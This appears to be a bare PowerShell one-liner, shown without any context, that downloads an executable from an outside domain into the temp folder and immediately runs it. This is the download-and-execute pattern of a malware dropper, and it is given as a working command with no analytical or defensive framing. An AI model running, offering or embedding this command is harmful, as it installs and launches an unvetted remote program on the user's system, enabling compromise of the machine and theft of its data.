
($dpl=$env:temp+'f.exe');(New-Object System.Net.WebClient).DownloadFile('http://alonqood.com/obi.exe', $dpl);Start-Process $dpl

